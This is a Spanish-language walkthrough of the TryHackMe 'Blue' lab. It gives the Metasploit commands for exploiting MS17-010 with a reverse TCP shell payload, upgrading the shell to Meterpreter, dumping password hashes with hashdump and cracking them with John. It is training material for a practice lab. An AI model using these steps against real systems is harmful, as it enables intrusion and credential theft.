# THM - Blue
[TryHackMe-Blue](https://tryhackme.com/room/blue)

Para comenzar el análisis se realiza un **nmap** a la ip de la máquina.

![Nmap1](/img/blue1.png)

![Nmap2](/img/blue3.png)

Gracias a este escaneo, podemos ver que hay un total de 3 puertos abiertos con un número menor que el 1000.

*Try Hack Me*  
![THM1](/img/blue2.png)

Se busca una vulnerabilidad concreta para el servicio que se encuentra en el puerto 445. 

![Nmap3](/img/blue4.png)

*Try Hack Me*  
![THM2](/img/blue5.png)

A continuación hay que encontrar algún *exploit* para la vulnerabilidad encontrada. Para ello se va a utilizar **Metasploit**, el cual se ejecuta escribiendo *msfconsole* en la línea de comandos.
```
search ms-17-010
```

![search](/img/blue6.png)

*Try Hack Me*  
![THM3](/img/blue7.png)

Elegir el exploit y ver sus opciones:
```
use 0
show options
set rhosts (ip THM)
set lhost (ip vpn)
set payload windows/x64/shell/reverse_tcp
run
```

![options](/img/blue9.png)

*Try Hack Me*  
![THM4](/img/blue8.png)

Una vez se haya ejecutado el exploit aparecerá la línea de comandos de la máquina vulnerable.

![shell](/img/blue10.png)

Pulsar *Ctrl + Z*.

![session](/img/blue15.png)

De esta forma conocemos la sesión en la que se encuentra la shell, lo cual será necesario más adelante.

A continuación se va a buscar un *exploit* de *shell_to_meterpreter* en Metasploit.

![search2](/img/blue11.png)

*Try Hack Me*  
![THM5](/img/blue12.png)

Una vez seleccionado el *exploit* se muestran las opciones:

![options2](/img/blue13.png)

*Try Hack Me*  
![THM6](/img/blue14.png)

```
set lhost (ip vpn)
set session (nº sesión encontrada)
run
```

Una vez convertida la sesión hay que seleccionarla para poder utilizar la línea de comandos.

![shell](/img/blue16.png)

Seleccionar la sesión en la que se encuentra el *Meterpreter*.

![shell2](/img/blue17.png)

Puede verse el usuario con el que se ha accedido y el registro de procesos.

![shell3](/img/blue18.png)

![meterpreter](/img/blue19.png)

Desde la consola *meterpreter* ejecutar el comando *hashdump*.

![meterpreter2](/img/blue20.png)

*Try Hack Me*  
![THM7](/img/blue21.png)

Una vez obtenido el hash de la contraseña, se debe copiar en un txt y descifrar la contraseña verdadera con la herramienta *John* de la siguiente manera:

![contraseña](/img/blue22.png)

*Try Hack Me*  
![THM8](/img/blue23.png)

A continuación hay que navegar entre las carpetas para encontrar las flags:
+ Flag1:

![flag1](/img/blue24.png)

*Try Hack Me*  
![THM9](/img/blue25.png)

+ Flag 2:

![flag2](/img/blue26.png)

![flag2](/img/blue27.png)

*Try Hack Me*  
![THM10](/img/blue28.png)

+ Flag 3:

![flag3](/img/blue29.png)

*Try Hack Me*  
![THM11](/img/blue30.png)